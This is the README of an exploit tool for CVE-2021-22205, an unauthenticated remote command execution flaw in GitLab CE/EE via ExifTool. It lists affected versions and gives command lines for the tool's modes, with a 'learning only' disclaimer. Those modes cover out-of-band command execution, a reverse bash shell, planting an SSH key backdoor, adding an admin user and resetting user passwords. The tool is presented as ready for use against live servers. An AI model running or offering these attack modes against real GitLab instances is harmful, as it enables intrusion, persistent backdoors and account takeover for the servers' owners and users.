# CVE-2021-22205

GitLab CE/EE Preauth RCE using ExifTool

*This project is for learning only, if someone's rights have been violated, please contact me to remove the project, and the last **DO NOT USE IT ILLEGALLY***

*If you have any illegal behavior in the process of using this tool, you will bear all the consequences yourself. All developers and all contributors of this tool do not bear any legal and joint liabilities*

## Description

An issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that were passed to a file parser which resulted in a remote command execution.

Affect Versions:

- \>=11.9, <13.8.8
- \>=13.9, <13.9.6
- \>=13.10, <13.10.3

## Features

- Gitlab version detection through the hash in Webpack manifest.json 

- Automatical out-of-band interactions with DNSLog & PostBin
- Support Reverse Bash Shell / Append SSH Key to authorized_keys
- Support ENTER to modify and restore gitlab user password

## Usage

```bash
üêö ‚Ä∫‚Ä∫‚Ä∫ python CVE-2021-22205.py

      ‚ñë‚ñë‚ñë‚ñë‚ñê‚ñê‚ñë‚ñë‚ñë  CVE-2021-22205
 ‚ñê  ‚ñë‚ñë‚ñë‚ñë‚ñë‚ñÑ‚ñà‚ñà‚ñÑ‚ñÑ  GitLab CE/EE Unauthenticated RCE using ExifTool
  ‚ñÄ‚ñÄ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ‚ñë‚ñë  Affecting all versions starting from 11.9
  ‚ñë‚ñë‚ñê‚ñê‚ñë‚ñë‚ñê‚ñê‚ñë‚ñë  security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild
 ‚ñí‚ñí‚ñí‚ñê‚ñê‚ñí‚ñí‚ñê‚ñê‚ñí  github.com/inspiringz/CVE-2021-22205

Usage:
    python3 CVE-2021-22205.py -u site_url -m rce1 'id'     # ÂëΩ‰ª§ÊâßË°å OOB ÂõûÊòæ
    python3 CVE-2021-22205.py -u site_url -m rce2 'id'     # ÂëΩ‰ª§ÊâßË°åÂÜôÊñá‰ª∂ÂõûÊòæ
    python3 CVE-2021-22205.py -u site_url -m rev ip port   # ÂèçÂºπ SHELL
    python3 CVE-2021-22205.py -u site_url -m ssh git/root  # SSH ÂêéÈó®Ê§çÂÖ•
    python3 CVE-2021-22205.py -u site_url -m add user pass # Ê∑ªÂä†ÁÆ°ÁêÜÁî®Êà∑
    python3 CVE-2021-22205.py -u site_url -m mod user      # ‰øÆÊîπ user ÂØÜÁ†Å => P4ss@GitLab
    python3 CVE-2021-22205.py -u site_url -m rec user      # ËøòÂéü user ÂØÜÁ†Å
```

## Screenshot

Detect:

![image-20211111130659726](images/image-20211111130659726.png)

RCE(Echo via PostBin OOB):

![image-20211111132623307](images/image-20211111132623307.png)

Reverse Bash Shell:

![image-20211111131442470](images/image-20211111131442470.png)

Append SSH Key to authorized_keys:

![image-20211111133555010](images/image-20211111133555010.png)

Gitlab user password modification and restoration:

![image-20211111132115090](images/image-20211111132115090.png)

## Reference

- https://github.com/projectdiscovery/nuclei-templates/blob/637eec3efac6eb384742c7aaa4e7d14f3392ede9/cves/2021/CVE-2021-22205.yaml
- https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22205.json
- https://github.com/righel/gitlab-version-nse
